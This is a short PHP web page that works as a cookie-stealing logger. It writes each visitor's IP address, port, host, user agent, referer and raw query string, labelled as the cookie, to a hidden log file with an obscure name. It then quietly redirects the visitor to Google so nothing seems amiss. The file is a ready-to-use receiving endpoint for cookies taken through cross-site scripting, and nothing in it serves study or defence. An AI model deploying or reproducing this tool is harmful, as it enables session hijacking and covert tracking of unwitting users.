<!DOCTYPE html>
<html>
<head>
</head>
<body>

<?php
function getIP() {
	if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
			  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
			  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote  = $_SERVER['REMOTE_ADDR'];

	if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
	elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; }
	else { $ip = $remote; }

	return $ip;
}

function logIP()
{
    $dataLog="0as8c7dcrt5b32as98cb6.txt";
    $cookie = $_SERVER['QUERY_STRING'];
    $register_globals = (bool) ini_get('register_gobals');
    if ($register_globals) $ip = getenv('REMOTE_ADDR');
    else $ip = getIP();
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $method = $_SERVER['REQUEST_METHOD'];
    $host = $_SERVER['REMOTE_HOST'];
	if($host === $_SERVER['REMOTE_ADDR']) {
		$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	}
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "";
    $date=date("l jS \of F Y h:i:s A");
    $log=fopen("$dataLog", "a+");
    if (preg_match("/\bhtm\b/i", $dataLog) || preg_match("/\bhtml\b/i", $dataLog))
        fputs($log, "IP: $ip | PORT: $port | HOST: $host | User-Agent: $useragent | METHOD: $method | REFERER: $referer | DATE{ : } $date | COOKIE:  $cookie <br>");
    else
        fputs($log, "IP: $ip | PORT: $port | HOST: $host |  User-Agent: $useragent | METHOD: $method | REFERER: $referer |  DATE: $date | COOKIE:  $cookie \n\n");
    fclose($log);
}
logIP();
?>

<script>
    setTimeout("location.href = 'https://google.com/';",3000);
</script>

</body>
</html>
